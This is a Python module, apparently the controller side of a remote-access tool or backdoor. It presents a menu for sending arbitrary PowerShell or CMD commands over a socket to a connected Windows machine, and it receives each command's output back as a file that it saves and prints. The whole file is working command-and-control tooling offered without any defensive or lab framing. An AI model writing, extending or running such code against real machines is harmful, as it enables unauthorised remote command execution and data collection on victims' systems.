import time
import socket
from termcolor import colored


def bytes_to_number(b):
    res = 0
    for i in range(4):
        res += b[i] << (i * 8)
    return res


def freestyle_menu():
    print(f"\t\t({colored('1', 'yellow')})Run Powershell Command")
    print(f"\t\t({colored('2', 'yellow')})Run CMD Command")
    print(f"\n\t\t({colored('0', 'yellow')})Back")

    return


def freestyle(con):
    while True:
        freestyle_menu()
        try:
            choice = input("#>")
            if int(choice) == 1:
                con.send("ps".encode())
                cmd = input("PS>")
                con.send(cmd.encode())
                time.sleep(1)
                filename = con.recv(1024)
                print(f"Filename: {filename}")
                con.send("Filename OK".encode())

                # Receive file
                size = con.recv(4)
                print(size)
                size = bytes_to_number(size)
                current_size = 0
                buffer = b""

                # Fetch file content
                try:
                    with open(filename, 'wb') as file:
                        while current_size < size:
                            data = con.recv(1024)
                            if not data:
                                break

                            if len(data) + current_size > size:
                                data = data[:size - current_size]

                            buffer += data
                            current_size += len(data)
                            file.write(data)

                except socket.error:
                    print(f"[{colored('*', 'red')}]Connection timed out.\n")
                    return False

                # Print file content to screen
                with open(filename, 'r') as file:
                    data = file.read()
                    print(data)

                msg = "OK".encode()
                con.send(msg)
                ans = con.recv(1024).decode()
                print(f"[{colored('V', 'green')}]{ans}")

            elif int(choice) == 2:
                con.send("cmd".encode())
                cmd = input("CMD>")
                con.send(cmd.encode())
                time.sleep(1)
                filename = con.recv(1024)
                print(f"Filename: {filename}")
                con.send("Filename OK".encode())

                # Receive file
                size = con.recv(4)
                print(size)
                size = bytes_to_number(size)
                current_size = 0
                buffer = b""

                # Fetch file content
                try:
                    with open(filename, 'wb') as file:
                        while current_size < size:
                            data = con.recv(1024)
                            if not data:
                                break

                            if len(data) + current_size > size:
                                data = data[:size - current_size]

                            buffer += data
                            current_size += len(data)
                            file.write(data)

                except socket.error:
                    print(f"[{colored('*', 'red')}]Connection timed out.\n")
                    return False

                # Print file content to screen
                with open(filename, 'r') as file:
                    data = file.read()
                    print(data)

                msg = "OK".encode()
                con.send(msg)
                ans = con.recv(1024).decode()
                print(f"[{colored('V', 'green')}]{ans}")

            elif int(choice) == 0:
                con.send("back".encode())
                ans = con.recv(1024).decode()
                print(ans)
                return

        except socket.error as e:
            print(e)
            break
